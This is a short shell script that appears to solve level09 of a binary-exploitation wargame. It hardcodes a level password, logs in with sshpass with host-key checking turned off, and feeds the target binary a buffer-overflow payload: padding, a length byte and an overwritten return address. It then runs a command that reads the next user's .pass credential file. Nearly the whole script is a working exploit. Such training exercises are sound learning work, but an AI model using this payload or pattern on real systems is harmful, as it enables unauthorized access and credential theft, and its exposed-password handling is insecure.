#!/bin/sh

PASS='fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level09@$OVERRIDE -p 4242 << EOF
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + 'cat /home/users/end/.pass' ") | ./level09

EOF